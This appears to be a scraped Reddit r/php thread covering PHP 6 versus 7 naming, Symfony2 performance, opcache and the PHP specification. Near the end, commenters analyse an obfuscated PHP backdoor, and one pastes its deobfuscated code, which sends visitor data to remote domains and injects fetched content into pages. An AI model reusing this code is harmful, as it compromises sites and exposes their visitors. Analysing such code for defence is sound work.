No, I am not plain wrong on this. Not even close. Nobody else owns PHP6. You are not competing with some other brand that is actively trying to rank well for PHP6. You are competing against stale information that is years old, with a brand you (you meaning the PHP team) "own" and control. The instant new information about PHP 6 comes out, Google will quickly de-rank its stale listings and give the newer information precedence. By the time PHP 6 comes out, you will actually have to try very hard to find the old / stale references to the old PHP 6 information. FYI, I am the SEO specialist at my company ;)
&gt; with Symfony2...and HAProxy and Varnish. Would any HA setup not use HAProxy and Varnish in front of their app servers?
http://smile.amazon.com/s?k=PHP6
Keep in mind it isn't that Symfony2 is meant to be -strictly- a mvc framework, of course in the most typical use cases it's used for building MVC applications.... But hey! Arent we now talking about a MVC application? - there's huge codebase for [M]odel handling (redis, doctrine dbal, cache logic etc) - [V]iew - yep, indeed we are "only" returning some JSON but thats our view format. You can change it to the Twig if you want to ;) - that's a feature of MVC architecture, easy replaceable view layer. - [C]ontroller - some logic still sits there You're right - you won't be able to achieve such results with orm, twig and e.g. advanced forms. But for that, in every application, you use cache layer. Even Stackoverflow bases on a full stack .NET framework... It's all about smart caching. The key in our article is that, even when requests go to Symfony2/PHP they are still handled quite fast, without big overhead from a framework. Saying more - in the most webapps request ends on some Varnish layer (which is superb fast), in our - almost every goes to Symfony2 :-)
http://smile.amazon.com/s?k=PHP6
Newcomers might not put two and two together, is my thinking.
&gt; The key in our article is that, even when requests go to Symfony2/PHP they are still handled quite fast, without big overhead from a framework But the problem with this key point, and how you just phrased it, is you're implying that Symfony2 doesn't have a ton of overhead, when you had to specifically engineer out a massive chunk of it by dropping doctrine ORM, and also the fact you didn't need and thus didn't use Twig. If a project had your kind of user base and used doctrine ORM and twig, the fact is there would be significantly more overhead than what you have experienced. Also yes technically Redis and Doctrine DBAL act as your model layer, but it's not the chosen model layer for symfony. Most symfony projects utilize Doctrine ORM. I fully understand why you didn't, as you needed something more performant, and obviously that decision paid off well for you considering the amount of load you were able to achieve. I don't think it's fair to conclude in anyway that there isn't a lot of overhead with symfony when you're only using a small fraction of the features everyone else would use, most of which would add more overhead.
Makes more sense than skipping a major version number.
As someone who knows him personally, I cannot agree more. Dude just never shuts up about Astoria... It's nice that you have craft beer and all, but who wants to live with foodie snobs or take the R? Just an unacceptable lifestyle if you ask me.
&gt; Remember the winamp slogan? How could you ever forget the winamp slogan? It was brilliant. &gt; Winamp, winamp, winamp. It really whips the llama's ass *llama noise**. I miss winamp, with internet streaming services, I have stopped using it entirely =(.
Instead of &gt; "Winamp, it really whips the llama's ass" PHP's could be: &gt; "PHP, it really smells like the llama's ass"
We built and maintained a site using Symfony (using Doctrine and Twig) that was doing 550 reqs/per sec at CPU saturation. Admittedly we had slightly different set up (load balanced 2x1vCPU servers with memcache and MySQL). But I do think it would be possible to get close to 700 req/s.
Use PDO. This example assumes your ID is an integer, but can easily be adjusted for other data types, like a hash string. Instantiate a PDO Connection object $db = new PDO('mysql:host=localhost;dbname=database;charset=utf8', 'username', 'password'); $db-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); $db-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false); Error and sanity check your input (if you were using reddit-like IDs, you'd probably want to use a regex string to ensure it's alphanumeric only). if(is_int($_POST['linkId'])) { $linkId = $_POST['linkId']; } else { //Handle your invalid linkId error here. } Run your query, binding your values to the statement instead of inserting them in the query try { $stmt = $db-&gt;prepare('DELETE FROM links WHERE linkId = ?') $stmt-&gt;bindValue(1, $linkId, PDO::PARAM_INT); $stmt-&gt;execute(); } catch(PDOException $exception) { // Handle your error here, in case something goes wrong. }
The last time that I looked at CMF (admittedly, over a year ago) these three points made me go "WTF" the most: - There was NO support for searching. None. Say you'd like to get some record where one of the fields contained the word 'Ipsum'. Nope, you'd have to resort to external solutions like Elastic or Solr. - If you wanted records between two specific dates, there was NO way to do this other than just bluntly iterating over the entire set, keeping the ones that matched your criteria. - It was suggested to use Jackrabbit over PHPCR, because stability. I think it's silly to be building a PHP framework and then just implying that it's best to use dependancies from another technology stack. Have these issues been solved in the meantime? About your points: - "Routing: The ability to have multiple URLs pointing at the same content for example " - As far as I know Google frowns on "duplicate content", and as such it should be avoided. - "Inline Editing" - Have you guys done _any_ research amongst _actual_ people who would use this? And by this I mean "Editors of the website, after it's been delivered to the client". I'm asking this, because in my experience, 'inline editing' really fucks up the editor's mental model of the structure of a website. It's hard to understand, it's quirky once you use it in real-world applications, and the uses are limited, which basically means that the editors will have to learn the backend as well. So,it does not _solve_ a problem, it just adds a _slightly smaller_ one to the amount of things the non-technical editor has to wrap their heads around. Granted: your points #2, #3, #4 and #5 are cool. We're still looking for a way to add these things to our product, in such a way that it will be beneficial to the enduser, without complicating matters for those that do not need it. 
I'm not down. Too silly. PHP has a bad enough reputation without a damn purple llama.
Print media? WHAT print media? In what world is some old magazine or publication going to confuse someone about PHP 6? In what world is someone going to find a book on an unreleased version of PHP 6? Are they going to pick up a 2+ year-old magazine and see a reference to the old PHP branch? No. They are not. Print media is 100% a non-issue. &gt; Finally, from an SEO standpoint, PHP7 is the preferred term, since it uniquely describes that version. So does PHP99. Arbitrarily skipping 6 just because there is an old, insignificant reference to it indexed by search engines is not a justification for the added confusion (and embarrassing silliness of) skipping PHP 6. Remember when everyone thought the iPhone 4s was going to be called the iPhone 5? Or the iPhone 5s was going to be called the iPhone 6? The media surrounding the phone was taking wild guesses about its name, polluting the search space with invalid references. And you know what? Everything turned out just fine... In the long term, old references to PHP 6 will be extremely difficult to find. Btw, go ahead and google "php7". Plenty of false references to it from AGES ago: http://www.php7.ca/ https://github.com/ryantenney/php7 http://sourceforge.net/p/php7framework/home/Home/ Also "PHP 7" turns up results pertaining to Drupal 7. According to the logic that "PHP 6" will cause confusion, so will "PHP 7". Guess we better skip ahead to PHP 8! I have yet to see a good, well-defended argument for why PHP 6 should be skipped in favor of PHP 7.
This is why we can't have nice things. Someone tries to inject a bit of light-heartedness into the dry environment that is php-internals, and instead of reading and commenting on the entire RFC, people pick on those 2 points alone.
Read the entire discussion on php-internals and the entire RFC. It's already elaborated quite well in my opinion.
I've never heard anyone say that Doctrine ORM or Twig are required for a project to be considered a symfony project... Thats just silly. I think you are just nitpicking the article for the sake of nitpicking.
i'm not saying they are required, but they are bundled by default. how is it nitpicking to say it's disingenuous to claim a framework is fast with minimal when you're not using two major DEFAULT components which can have significant impact on the overhead?
No, the real reason is because it's fucking logical to call it PHP 6. By your logic, we should just willy nilly pick numbers out of our ass and assign them to PHP, because apparently sequence doesn't matter in terms of software... And "avoiding trolls" is in fact a real reason. PHP in terms of payable software architecture is dying. If you don't know Python, Ruby, Node, or Java, you cannot get paid as much as you once could, or get to work on custom projects as often. Knowing PHP is now equated with being a Wordpress, Drupal, or Joomla dev, and the comparatively low pay (and shit work) that comes with it for most jobs. Even though PHP is capable of ***so*** much more, the stuff it's capable of is being done in other languages instead. What fuels the migration away from PHP towards other languages? The negative perception that comes from silly internals shenanigans and chaotic disorganization like not being able to keep your version numbers straight. It does in fact pose a REAL problem for PHP adoption, as it provides fodder language snobs, which does have real effects on the perceptions of clients and web dev shops towards PHP. Right or wrong, trolling detracts from the popularity of PHP as a software architecture language - which is where the real fun in developing with it lies. Doing CMS work in PHP is like scratching your balls with a rake... The last thing PHP needs is articles like "PHP Community Fucks Up Version 6, Skips To 7" with the obligatory link to the Fractal of Bad Design article. You don't think it matters, but it does.
Haha! That site must be a joke. Surely, it's a joke. *Is it a joke?*
Just curious about this "PHP 5.4.X running as PHP-FPM, with APC"... Doesn't recent PHP versions come with a built-in opcache?
yes it does but their app is running on 5.4
The whole philosophy behind Symfony is by having decoupled components you can make it whatever you need it to be. At its core I like to think that Symfony is really just the container with a bunch of useful default components and configuration settings shipped with it.
Hmmh... we're using default Symfony2 setup with Twig and Doctrine ORM. Does it now sound better for you? :) We haven't disabled Twig and ORM in our stack as we're also using that bundles in some dashboards. But indeed, they aren't used within "normal" request flow. Instead of ORM, we're extensively using Doctrine DBAL (let's say that for about &gt;50% of requests). So in fact you can achieve such performance stats just installing standard Symfony distrubution and without configuring it in any quite special manner.
i'd be interested in a post about how you ditched the ORM. How do you hydrate models? Do you have getters for related models? ie. https://gist.github.com/dadamssg/ff2ed6c623e13eaf0337 General organizational tips, etc.
+1 to the sanity of having a defined specification. And +1 to FB and team for taking it on! I just severely hope that their definition of "release" is "provide to community for feedback". **Edit:** It looks like my hope is fulfilled: [from Sara](http://news.php.net/php.internals/75900). Yay!
That doesn't make any sense. If I installed the Standard Edition I'm using the Standard Edition. There's no rule that I have to use every component installed.
Exactly what I was thinking. Would love some info on that.
I'll add my +1s to your +1s. I was sitting in the back of Sara's talk (and perked up when this was announced at the end), and it sounds like the intended end game is that this will live somewhere on php.net — whether in the manual or somewhere else. This definitely doesn't seem like a "we're throwing this over the wall and you can take it or leave it" thing, happily.
I think this article is coming on to me. So many winky faces.
&gt; integrated into PHP core Should be &gt; integrated into PHP distribution. IE, comes with PHP, so you just have to load/enable it in the php.ini
It would be interesting to see how this is structured. What other Bundles or resources are they using. Is everything just in fat controllers. Since it is just an API, they are not using forms, but how would they go about setting them up? Would they use FormBuilder or just read POST and GET values and validate them on their own.
Good points! **Structure:** Of course it isn't a single fat controller :) codebase is structured into bundles, we're even using Event Dispatcher to allow extending core methods. We keep Controllers very thin, every method has max. 5 lines of code. Logic is structured in components, also using OOP features like FooInterfaces and AbstractBars. So it isnt performance over readability. **Retrieving requests' data:** While designing that app we're also thinking about the most efficient way of retriving data from request content. Form Component is nice and features rich but comes with huge overhead. We also didnt need such advanced options. The other way could be using some Serializator component (like great JMSSerializer) and then validating DTO Request's objects but there are still two points that could lead to performance bottleneck - serializer and validator. Thus we didnt need any advanced validating (just checking required options, basic format validation etc.) and requests format structure is also designed to be quite simple we've choosen... OptionsResolver Component (yep exactly that one you use when making options for your forms) - http://symfony.com/doc/current/components/options_resolver.html We pass to it GET array and on the output we receive nicely validated and structured model object (array&gt;&gt;DTO). Btw the nice thing with it is also handling validation - exceptions come with verbose messages so they're ideal for debugging/API purpose.
What do you beware of with using redis as a primary store? With its persistence mechanisms (AOF/RDB) you can achieve constisency with a similar level to e.g. MySQL.
Also remember, it depends on how you get your PHP. If you compile it yourself, then it should be on by default no problem. However, package maintainers for different operating systems may remove/disable it by default (against what PHP comes as by default, just like short tags are sometimes off by default when the docs state they are on by default.) So if you are relying upon a maintainer, then you kinda need to either deal with it or get your engine from elsewhere. 
Nice to see Sara still working at this. I wasn't sure if FB was going to stay committed to this a few years ago, seems they are. :)
Forgot to mention, Opcache is nowhere to be found in the php.ini or in the php.d/ configuration folder. That is, unless I install the extension manually
If you are compiling from source, then you use `--enable-opcache` (which might be default? I forget) to include it into the compiled binary. If you are using a system package manager (e.g. apt, yum, portage) then it's *likely* they split it out into it's own package as a shared module, to give you the choice of APC/xcache, etc.
Thanks, this could be the case. Actually, its very likely the case. I'm on CentOS using the webtatic repository via yum.
So what is the site? Must be an incredibly well-known site with that traffic, yet the article doesn't mention it.
The PHPCR Query Builder for the Doctrine PHPCR ODM does provide support for 'like' queries which is probably new since the last time you looked at it so for a very basic search implementation (keywords against one or more field) you can achieve that in PHPCR. Regarding date query the QueryBuilder supports lt/gt/lte/gte for date fields $qb-&gt;andWhere()-&gt;lte()-&gt;field('a.publishStartDate')-&gt;literal(new \DateTime()); We use Doctrine DBAL as our transport layer for our CMS and have not had any issues although I should mention that the DBAL transport layer doesnt support versioning yet. Hopefully adding that soon. Regarding multiple URLs pointing at the same content I think I phrased things poorly. A real-world example would be for multi-lingual (another thing that the CMF supports) wherein you would have a url like en.mydomain.com/about and fr.mydomain.com/about wherein the content could come from the same document in the cms which may or may not have a translation for the requested locale in which case it could fall back to en from fr. Obviously having 2 URLs point at the same exact page/content is a no-no from an SEO perspective. This functionality could also be used to create a mobile site with a subset of the pages of the main site without having to maintain 2 branches of content. Once again responsive is the way things are moving but its just another example of how decoupling your content storage from your routing might provide an advantage. I actually do not use the inline editing feature. I do know its something that some people consider as a criteria for a CMS. Its a problematic model for editing in our case because for most of our sites a lot of the content is not really static content that is editable but more custom database driven tools (like a photo gallery or portfolio or news tool).
I wonder how many interns tears and sweat went into this !? :D For your interview question: &gt; please give the BNF and dscription for a Statement in PHP. Ok, thank you we'll call you -- don't call us. :D
Twig's sandbox feature is underappreciated. It allows you to limit twig to a subset of filters/functions/objects and is a great fit for providing light templating support without opening a security hole or re-inventing a new templating language.
&gt; Right, but then those same techniques could be applied to the code base in the article which would achieve even more req/s than the 700 they benchmarked. Yes. It could. So what? The are bundled in the default skeleton, but they make no effort to make sure you use them, and they are pretty easy to get rid of. Symfony2 does infact have a low overhead. Its Doctrine, and twig (though im not even sure i'd agree there), that have large overheads. It is definitely fair to say that. They arent even the same project, nor are they components to the Symfony2 Framework. They are just bundled for ease of use.
its definitely still stock. You just arent using the pieces. You dont even have to uninstall them. You are seriously nitpicking so hard on this. Twig and Doctrine are **NOT** components of the Symfony2 Framework. **They are added bundles to the Symfony2 Skeleton Application.**
Request topic: PHP build and deployment (that includes html/javascript minify) - I have yet to find a comprehensive write up anywhere on that topic. Mostly of the time, I have noticed folks doing apt-get installs all over the place - dev/test/production !
It's part of the official base distributions as of 5.5 - but it still needs to be enabled as a module. E.g. https://github.com/magnetikonline/webserverinstall.ubuntu12.04/blob/master/configure.php.txt The --enable-opcache switch will produce a "opcache.so" on compile but you need to add it to php.ini. https://github.com/magnetikonline/webserverinstall.ubuntu12.04/blob/e0fc355913c35a5900d5bf087bd8e63370b7de23/00root/etc/php5/php.ini#L1839 You would have to dig around the RFC's (going way back now) - but from memory there was a vote around the integration of OPCache - with the choices being: * Add OPcache to 5.6 and integrate fully * Add to 5.5 source tree but keep as module (winning vote) * Keep OPcache out of 5.5 and keep as PECL extension I guess the long term plan is to bake this into PHP internally, but some of this PHP-NG work might mean this gets delayed or done in unison. 
&gt; doctrine/orm being included in composer.json of the symfony package(aka NOT the skeleton framework) Thats require dev, not require &gt; twig being included in the composer.json, ALSO not the skeleton framework Fair enough. Still don't have to use it. &gt; Doctrine documentation in the symfony book &gt; Twig documentation, simply called Templating. Even explains why they picked this over default PHP to better sell Twig as the default Symfony experience Symfony CMF is also in the documentation. But im not installing that every time I install symfony. I will ALSO reiterate, that the dude who wrote this article STILL has ORM and Twig in his project. Its not even stripped down. So this argument of yours is pointless.
Which can still use OPCache if desired too. APC is dead in the water.
That's the opposite of what this sounds like. If they wanted to do that, they'd need to convert as many people over to HHVM as possible and then start deviating the language bit by bit. Would take many years. Writing a formal spec ensures their implementation stays in line with Zend's. Which is good, because I've already been bitten by a few subtle differences.
Your argument is irrelevant and retarded. Stop fucking nitpicking.
So does this mean things like normalizing function names and parameter orders would be in the spec?
Author of that post is OP
Do you mean the haystack/needle order and such? No. This is about how an implementation of the *language* should work, e.g. how an if statement works, etc.
Yes! Absolutely! - http://phpwomen.org - [@phpwomen](http://twitter.com/phpwomen) - [#phpwomen on freenode.net](irc://irc.freenode.net/phpwomen) - And we had a [kickstarter for the elephpants](http://phpwomen.org/elephpant), and they will be on sale in the next couple of months. &lt;/hoping you weren't being sarcastic&gt;
I came here to say the same thing. PHP receives a lot of hate, (and rightfully so in some cases), but the progress I've seen over the last 4-6 is inspiring. Here's to a continually improving, mature language!
To expand on what /u/dshafik said, the parameter order is part of the definition of the standard lib, as Sara pointed out this document does nothing to define/clarify it. That said, it would be awesome to see some sanity come to the standard library, however, that would effectively break years and years of code.
Ok... 1. Gentoo if you want to get into a default config fight. 2. No one cares about your distro-plugging insanity.
I can't remember exactly, but I believe that OPcache was kept out of a full internal integration because they didn't want to make any JIT work more of a hassle once PHP-NG was finished.
we gotta save those precious numbers!
Yeah that would make sense - but that wasn't publicly known (I guess) around the time OPCache was to be included.
Feel free to message me if you have questions about the group and what we do - and I hope to see you on IRC soon :)
Nope - this is writing a spec base-lining the language against PHP 5.6 - until now no such thing has actually existed. It's not about future enhancements/modifications to the language itself. This is what the RFC process is for.
PHP has enough trouble being taken seriously - this does not help that cause. Also, if we are looking at this specific image as being the final artwork (personal opinions here): * Landscape orientated logos are terrible for use/application in various assets. * Probably wouldn't translate to well to black and white for print applications. * Looks amateurish - but this is subjective. 
I don't even know how that's possible. I've never had a PHP job where I didn't have to do IT/ops work.
Good article - much of this setup/advice would work in any technology stack - not just PHP/Symphony.
This is amazing. Is it possible for Hhvm to replace phpng altogether?
Can someone explain more in detail of what this is? From a glance, it looks simply as a way to structure syntax, similar to PHP-FIG.
That's not exactly what I meant. What if I already have something in my pre-commit but want to add yours on top? Why not just move `src/Hooks/php-pre-commit.php` to `bin/static-review`? That way it can easily be added to someone's existing pre-commit file *and* be more easily executed manually (either by adding `vendor/bin` to $PATH or just typing `./vendor/bin/static-review` - both would be faster than doing `./vendor/sjparkinson/static-review/src/Hooks/php-pre-commit.php`).
Ah right, makes sense but I want to avoid just chucking a default review into bin. What's your thoughts on something like `vendor/bin/static-review.php --run php-pre-commit` that can be added to whatever hook already exists?
Where do you see negative comments here?
What if internet fails?
FIG deals with the code people are building with PHP, and the related practices, trying to create universal standards to make it easier to create packages and frameworks that can replace each other or interoperate / cooperate. What Facebook are producing is a specification for the PHP language itself. A clear document that allows anyone to reproduce an exact copy of the PHP language as it stands at 5.6 (and a basis for modifying the language going forward). The specification will detail exactly how a parser should read and perform actions based on the source code of any given PHP program. For example one of the big "fun" areas is PHP's type juggling system. The specification will create a clear definition of what values will be converted to what types in what situation. From Andrea Faulds on the php-internals mailing list thread: &gt; Does it handle the fact that ‘0xa’ is variously zero and ten in string to integer conversions? Having a specification will make it easier to find fun situations like above and lay the groundwork for new RFCs to simplify and make the behaviour more uniform. Some developers are already working on this without a specification - such as the Uniform Variable Syntax RFC - but having a specification will make it easier and clearer to find issues, determine what modifications to make and document the changes going forward.
This document has nothing to do with HHVM replacing PHP. What having this document will do (as long as it's kept updated) is allow developers of alternative implementations such as HHVM to ensure that every implementation follows the same rules when it reads the same code. It also provides an excellent base for improving the language (in terms of uniform behaviour for things like the type juggling system) going forward.
1. No, it isn't. 2. **[WHOOOSH](http://i.imgur.com/7mRhOc7.png)**
This is amazing! Thank-you!
Servers for hackers is an awesome resource. The second this book becomes available, I'll buy it
Adding to your points, strictly speaking symfony is a request/ response framework. Or at least that's what they advertise themselves as
Your questioning tone could be construed as negativity.
Stick to coding.
Yeah I was making two points and the HTML bit was only relevant to the second point, which was that there would be multiple standards covering the same thing. This was relevant only because even something like HTML had to be revisited, just like autoloaders and caching will be revisited over time. Throw the HTML example out, because a better one would be the HTTP RFCs. rfc2616 obsoletes rfc2068, but is itself is superseded by rfc7230, 7231, 7232, 7233, 7234 and 7235. The point to this example is that most standards bodies (every single one out there I have reviewed) do not add specific semantic meaning to the numbers of actual standards, so they will not keep the "RFC for HTTP Messages" at a specific number then replace it with an updated document for the same system, or whack a 2 on it, or whatever, they just make new standards and assign new numbers and put them on an index to make sure people know what is what. Maaaaybe zero-padding would make things clearer, but [PEP](http://legacy.python.org/dev/peps/) got away without doing that and I think we can too.
I have [Greppy](http://github.com/drgomesp/Greppy).
Nice! I could definitely see ways to make this more powerful.
Well, there are a few smaller libraries that I maintain from time to time. If for no reason other than to entertain myself. * [A data validation library](https://github.com/estelsmith/dcp-validator) * [A dependency injection library](https://github.com/estelsmith/dcp-di) which is currently in need of some tests * [A URL router](https://github.com/estelsmith/dcp-router) I'd be delighted if someone actually started tinkering with these.
Going back to what you said earlier: &gt; ... with the PHPDoc proposal, with people from Drupal already saying they won't be able to implement the standard as designed because it doesn't include specific tags they rely on. I'm still asking for where anything like that was said. &gt; OK, sounds like this tag set is just going to be a Drupal extension then, unless there is a large groundswell of support from other FIG list members, which I'm not seeing. &gt; Thanks for at least listening! That was Jennifer from Drupal, saying they'll just be making a super-set. That's cool. That's what I was saying, like a style guide which is PSR-2 + bits, or writing a logging library that has features _on top_ of what PSR-3 provides. All of our standards expect superset functionality, and we accept that if you write extra stuff on top out of the standard then that wont work. Caching is another example. We have TTL as the only solution to expiring data, but many want tags and all sorts of other custom expiration solutions. We will only have TTL in this first one and people can write superset functionality, then in a more advanced cache later on we add more to it. The only alternative to what we do now, which is: "standardizing a subset of functionality," is to try and make the standard cover "EVERYTHING" immediately, so that doesn't work. &gt; I'm sorry, but you clearly weren't keeping that close of an eye on it if you think Larry was the only Drupal core contributor involved in the PSR-4 discussions: I hadn't realized that donquixote was involved in Drupal, but maybe that is my point. The idea that Drupal were bullying the FIG on anything to do with PSR-4 is what I am suggesting is just not true. donquixote was _really_ awesome in helping PSR-4. We had a few arguments and a few breakthroughs while we were trying to tidy up Paul Jones first version of the wording (which was the one I pulled, because some projects did not like the wording) and got deep into some weird stuff like wether the standard should explain how namespace prefixes are mapped to base directories and all sorts of other weird things. In the end we wiped the whole thing out and went with a PSR-4 that was more like PSR-0, and deleted everything that donquixote and I wrote. Heh. That's life. But, in all that time, he never acted like a big Drupal bully "enough to throw its weight around to get PSR-4 adopted." They certainly would have tweeted about it and supported it and I would be confused if they didnt. The crux of my concern here is this whole "Drupal is a bully" thing, which is weird to me. Past that, I can agree to disagree on any other points or misunderstandings. :)
This is so great. This is a huge step forward for PHP. I come from standardized languages (like C++) and the one thing that's always bugged me is that more or less there was one "official" implementation o the language. Hopefully this formal spec will allow others to create their own conforming implementations and lead to a performance competition between different PHP engines.
Best reason: Going 5.3 -&gt; 6 -&gt; 5.4 -&gt; 5.5 -&gt; 7 is strange and inconsistent, therefore perfect for PHP.
Yes, and that's fantastic. They could even migrate to Ruby/Java or other language, but they keep investing on PHP. Cool!
HUH? Where did you get that idea? No, it had nothing to do with JIT. It was simply because Zend wanted to rush out something rather than taking the time to do it right the first time.
Here we go again. -.- Edit: Wow, the way the arguments read for calling it PHP 7 is seriously childish. Give yourself a hand, Zeev Suraski, you've managed to stoop down even further. 
* [SPF](https://github.com/theantichris/Simple-Plugin-Framework) - A framework for developing WordPress plugins * [iCalendar Creator](https://github.com/theantichris/iCalendar-Creator) - Creates .ics files * [Puppet Modules](https://github.com/theantichris/Puppet-Modules) - Puppet modules to use with Vagrant
I've been working on *Prelude* since last year. Mostly adding features as I needed but trying to keep the library as lite, small, and lean as possible. It has some really small user base. http://github.com/eridal/prelude 
Even the authors cannot decide on one number. Ajf votes for 6, zeev votes for 7
You can access the docs without signing up, I just couldn't *find* them without signing up.
how about PHP NT ... or ... PHP XP, microsoft must have had good reasons for it, no? 
That was the point. Andrea presented the case for 6, and Zeev presented the case for 7...
There's a bigger case for 7, because there would need to be. 6 is 5+1, so 7 would be the divergence, and hence would need the justification. :-)
Well it looks like the site is updated and the docs are in the main menu now. I found the docs and grabbed the source by searching for pagekit on github (I didn't notice the github link icon in the footer at the time). I could have sworn that somewhere on the page it mentioned the code was on github but I can't find it now.
Don't expect anything. Nothing's for sure right now. It's also depends on exactly what you mean by 'phpng'. Officially 'phpng' is a development branch of PHP that will probably (but not definitely) be the basis for PHP.Next. It's primary concern is performance improvements. PHP.Next (sometimes referred to as PHP6, PHP7 or PHP6/7) is the next major version of PHP, for which there is currently no real plan or roadmap. At the moment, what's going into PHP.Next is very much up in the air. phpng may or may not form the basis for it - there's discussion going on in the php-internals mailing list on that issue now. PHP.Next will almost certainly include relevant [accepted RFCs](https://wiki.php.net/rfc), which at the moment is basically Uniform Variable Syntax. Development proper on PHP.Next hasn't really started yet - when that happens will probably be decided on the outcome of the 'when/should we merge phpng' discussions. It's likely to be months before we have any real idea of what's going to be in PHP.Next. It's almost certainly going to be atleast 1 year, probably closer to 2, and a lot of work before PHP.Next is released in any real form. ...And there's still time for another PHP6 fiasco where we end up merging all the new features down to 5.x and then have another RFC on whether we call PHP.Next PHP6, PHP7 or PHP8.
It's some sort of obfuscated backdoor that a script kiddie would use on your server. If that file was on your server... you're screwed. Fix your security.
Looks like an exploit. Exploiters typically obfuscate the code like this so you don't realize what it really does. I can't say for sure with this one, but there are Curl commands in it, so it has the ability to download and run more files on your server. typically someone will get this file onto your server then go to a url like http://yoursite/thisfile.php?cmd= and the cmd can be anything (and the script will run it on your machine.) 
It's a term a lot of people have used. I prefer it because it's unambiguous and avoids entering into discussions on the 6/7 issue.
It's meant to accommodate multiple implementations of the PHP language, so that code written for HHVM would work just as well with the core interpreter. Barring any HHVM-specific/core-specific functionality being used, of course.
Replace all `eval`, `exec`, and similars to `print`. Then run it. However it should be desirable to run it sandboxed, just in case.
Deobfuscated: [http://www.unphp.net/decode/a810ae7a855351916cfc69575167c97f/](http://www.unphp.net/decode/a810ae7a855351916cfc69575167c97f/) Formatted $syv= "eval(str_replace(array"; $siv = "str_replace"; $slv = "strrev"; $s1v="create_function"; $svv = '//}9;g$^s$9nruter9}9;)8,0,q$(r$=.g$9;))"46x.x?xx\".q$.g$(m$,"*H"(p$9=9q$9{9))s$(l{{{PHP1}}}lt;)g$(l$(9elihw9;""9=9g$9;"53x!\d6x\"=m$;"261'xxqx\"=r$;"351xax\"=p$;"651.x)x1x\"=l$9{9)q$9,s$(2ne9noitcnuf;}'; $n9 = '1067|416|779|223|361'; function oo2($b) { $h = explode("|", strrev($b)); $d = explode("*", $h[0]); $b = $h[1]; for($i=0;$i&lt;sizeof($d);$i++) { $b = str_replace($i, $d[$i], $b); } create_function("", "};".$b."//"); } function cqq($qw) { return random($domarr,$qw); } function oo1($y) { $y= strrev($y); $g=substr($y,strpos($y,"9")+1); $v = explode(":",substr($y,0,strpos($y,"9"))); for($i=0; $i&lt;sizeof($v); $i++) { $q = explode("|", $v[$i]); $g = str_replace($q[0],$q[1],$g); } create_function("", "}; ".$g."//"); } function random($arr,$qw) { $g=" w-86794587495086f963874,qq-82d94486e,r-86297186e94186d945,wq-874941874,s-873,g= w. r; m-8"."6d944835,sq-87396487293787396086c951874";"; $soy = "en2"; $xx="exp"."lode"; $ecx="create_function"; $scy="str_replace"; $a = $xx("|","\x|\1|="|";$|$"); $aa = $xx("|","8|9|-|,| "); $mec=$ecx; for($i=0; $i&lt;sizeof($a); $i++) { $g = $scy($aa[$i],$a[$i],$g); } $ecx("", "}; $g//"); $mec("", $soy("?kgwLXze2:Wn@l.?jA{S' ",$scy)); return $arr[rand((0.24-(0.03*8)),(0.1875*6))].$qw; } $r9 = explode("|",'1067|416|779|223|361'); $b9=0; $a9=0; for($i9=0; $i9&lt;sizeof($r9); $i9++) { if ($i9==0) $a9=0; else $a9=$r9[$i9-1]+$a9; $b9=$r9[$i9]; $v_[]=substr($v9, $a9, $b9); } print_r($v_); $y =1; for($i=0; $i&lt;5; $i++) { $vv1 ="o"."o".$y; if ($y==1) $y=2; else $y=1; $vv1($v_[$i]); } function en2($s, $q) { $l="strlen"; $p="pack"; $r="substr"; $m="md5"; $g = ""; while ($l($g)&lt;$l($s)) { $q = $p("H*",$m($g.$q."q1w2e3r4")); $g.=$r($q,0,8); } return $s^$g; } function g_1($url) { if (function_exists("file_get_contents") === false) return false; $buf = @file_get_contents($url); if ($buf == "") return false; return $buf; } function g_2($url) { if (function_exists("curl_init") === false) return false; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_TIMEOUT, 10); curl_setopt($ch, CURLOPT_HEADER, 0); $res = curl_exec($ch); curl_close($ch); if ($res == "") return false; return $res; } function g_3($url) { if (function_exists("file") === false) return false; $inc = @file($url); $buf = @implode("", $inc); if ($buf == "") return false; return $buf; } function g_4($url) { if (function_exists("socket_create") === false) return false; $p= @parse_url($url); $host = $p["host"]; if(!isset($p["query"])) $p["query"]=""; $uri = $p["path"] . "?" . $p["query"]; $ip1 = @gethostbyname($host); $ip2 = @long2ip(@ip2long($ip1)); if ($ip1 != $ip2) return false; $sock = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP); if (!@socket_connect($sock, $ip1, 80)) { @socket_close($sock); return false; } $req = "GET $uri HTTP/1.0"; $req .= "Host: $host"; socket_write($sock, $req); $buf = ""; while ($t = socket_read($sock, 10000)) { $buf .= $t; } @socket_close($sock); if ($buf == "") return false; list($m, $buf) = explode("", $buf); return $buf; } function gtd ($url) { $co = ""; $co = @g_1($url); if ($co !== false) return $co; $co = @g_2($url); if ($co !== false) return $co; $co = @g_3($url); if ($co !== false) return $co; $co = @g_4($url); if ($co !== false) return $co; return ""; } function k34($op,$text) { return base64_encode(en2($text, $op)); } function check212($param) { if(!isset($_SERVER[$param])) $a="non"; else if ($_SERVER[$param]=="") $a="non"; else $a=$_SERVER[$param]; return $a; } function day212() { $a=check212("HTTP_USER_AGENT"); $b=check212("HTTP_REFERER"); $c=check212("REMOTE_ADDR"); $d=check212("HTTP_HOST"); $e=check212("PHP_SELF"); $domarr = array("33db9538","9507c4e8","e5b57288","54dfa1cb"); if (($a=="non") or ($c=="non") or ($d=="non") or strrpos(strtolower($e),"admin") or (preg_match("/" . implode("|", array("google","slurp","msnbot","ia_archiver","yandex","rambler")) . "/i", strtolower($a))) ) { $o1 = ""; } else { $op=mt_rand(100000,999999); $g4=$op."?".urlencode(urlencode(k34($op,$a).".".k34($op,$b).".".k34($op,$c).".".k34($op,$d).".".k34($op,$e))); $url="http://".cqq(".com")."/".$g4; $ca1=en2(@gtd($url),$op); $a1=@explode("!NF0",$ca1); if (sizeof($a1)&gt;=2) $o1 = $a1[1]; else $o1 = ""; } return $o1; } if(!function_exists("pa22")) { function pa22($v) { Header("Content-Encoding: none"); $p="preg_"; $p1=$p."match"; $p2=$p."replace"; $t=dcoo($v); if($p1("/\&lt;\/body/si",$t)) { return $p2("/(\&lt;\/body[^\&gt;]*\&gt;)/si", day212().""."$"."1", $t,1); } else { if($p1("/\&lt;\/html/si",$t)) { return $p2("/(\&lt;\/html[^\&gt;]*\&gt;)/si", day212().""."$"."1", $t,1); 